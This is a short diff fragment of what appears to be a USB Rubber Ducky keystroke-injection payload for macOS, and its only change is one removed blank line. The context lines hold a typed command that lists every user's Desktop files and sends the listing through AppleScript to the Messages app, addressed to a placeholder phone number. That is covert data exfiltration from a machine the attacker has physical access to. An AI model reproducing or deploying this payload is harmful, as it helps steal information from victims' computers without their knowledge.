@@ -20,7 +20,6 @@ DELAY 1000
 ENTER
 DELAY 500
 STRING x=$(ls /Users/*/Desktop); osascript -e 'tell application "Messages" to send "'$x'" to buddy "Phone Number HERE"'
-
 DELAY 500
 ENTER
 DELAY 500
